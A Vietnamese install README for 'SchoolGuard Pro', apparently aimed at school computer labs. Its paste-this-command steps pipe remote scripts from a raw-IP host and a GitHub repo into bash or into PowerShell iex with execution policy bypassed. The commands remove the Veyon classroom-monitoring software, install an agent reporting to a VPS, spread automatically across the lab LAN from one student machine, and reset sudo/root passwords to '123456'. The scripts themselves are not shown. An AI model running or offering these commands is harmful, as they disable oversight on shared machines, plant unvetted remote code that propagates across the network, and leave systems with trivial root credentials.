# SchoolGuard Pro — Bộ Cài Đặt Nhanh Cho Phòng Máy (Xubuntu & Windows)

> **Trang Web Quản Lý:** **[https://103-149-172-179.sslip.io](https://103-149-172-179.sslip.io)**

---

## 🪟 LỆNH COPY NHANH TRÊN WINDOWS (`Win + R` / PowerShell / CMD)

Bấm **`Win + R`** (hoặc mở **PowerShell** / **CMD**), bấm nút **Copy** ở góc phải khung lệnh bên dưới rồi dán vào và nhấn **Enter**:

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/win'))"
```

*(Nếu chỉ muốn gỡ sạch Veyon trên Windows):*
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/remove_veyon_win.ps1'))"
```

---

## ⚡ BẢNG LỆNH COPY NHANH TRÊN XUBUNTU (`Ctrl + Alt + T`)

Mở Terminal trên máy học sinh (**`Ctrl + Alt + T`**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới và dán vào Terminal:

### 1. Lệnh Gộp 2-Trong-1: Xóa sạch Veyon + Cài đặt SchoolGuard (Khuyên dùng)
*(Chạy được ngay cả khi không có hoặc quên mật khẩu `sudo`)*
```bash
wget -qO- https://103-149-172-179.sslip.io/remove-veyon.sh | bash && wget -qO- https://103-149-172-179.sslip.io/install.sh | bash
```

### 2. Lệnh Từ 1 Máy Học Sinh Tự Động Cài Lan Truyền Cho Cả Phòng (Cùng Mạng LAN)
*(Chỉ cần ngồi ở 1 máy học sinh bất kỳ, tự động quét dải mạng `192.168.1.x` và cài cho các máy đang bật trong phòng)*
```bash
wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/lan-deploy.sh | bash
```

### 3. Lệnh Tải Siêu Tốc Từ Máy Bên Cạnh Trong Phòng (Qua Trạm LAN Nội Bộ `:8888`)
*(Nếu trong phòng đã có `pc-01` (`192.168.1.136`) hoặc `pc-18` (`192.168.1.154`) cài rồi, các máy khác có thể tải trực tiếp qua mạng LAN nội bộ trong 1 giây)*
```bash
curl -sSL http://192.168.1.136:8888/go | bash
```
*(Hoặc từ `pc-18`)*:
```bash
curl -sSL http://192.168.1.154:8888/go | bash
```

### 4. Lệnh Tách Riêng Từng Bước (Nếu muốn chạy riêng)
* **Bước 1 — Tắt hẳn & Xóa sạch Veyon:**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/remove-veyon.sh | bash
  ```
* **Bước 2 — Cài đặt SchoolGuard Pro:**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/install.sh | bash
  ```

### 5. Lệnh Đặt Lại Mật Khẩu `sudo` / `root` Về `123456`
* **Chạy trong Terminal (`Ctrl + Alt + T`) hoặc GRUB Root Shell:**
  ```bash
  wget -qO- https://raw.githubusercontent.com/anlor1002-alt/schoolguard-xubuntu-setup/main/reset-sudo.sh | bash
  ```
* **Nếu đang ở GRUB Recovery Mode (Không cần mạng & Không cần mật khẩu cũ):**
  ```bash
  bash /home/*/.local/share/.schoolguard/reset-sudo.sh 123456 && reboot
  ```

---

## 🪟 BẢNG LỆNH COPY NHANH TRÊN WINDOWS (Chạy được trong cả PowerShell, CMD và `Win + R`)

Bấm **`Win + R`** (hoặc mở **PowerShell** / **CMD**), bấm biểu tượng **Copy** ở góc phải khung lệnh bên dưới rồi dán vào và nhấn **Enter**:

### 1. Lệnh Gộp 1-Click Trên Windows: Tắt Veyon + Cài đặt SchoolGuard (Khuyên dùng)
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/win'))"
```

### 2. Lệnh Chỉ Xóa Sạch Veyon Trên Windows (Gỡ hoàn toàn)
```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;iex((New-Object Net.WebClient).DownloadString('https://103-149-172-179.sslip.io/remove_veyon_win.ps1'))"
```

---

## 📦 CÀI ĐẶT BẰNG USB / BẤM ĐÚP CHUỘT (KHÔNG CẦN GÕ LỆNH)

1. Tải gói **[SchoolGuard-Xubuntu-Setup.tar.gz](./SchoolGuard-Xubuntu-Setup.tar.gz)** giải nén ra Desktop hoặc USB.
2. Bấm đúp **`1-Xoa-Sach-Veyon.desktop`** để vô hiệu hóa Veyon.
3. Bấm đúp **`2-Cai-Dat-SchoolGuard.desktop`** để cài đặt và tự động kết nối về VPS.
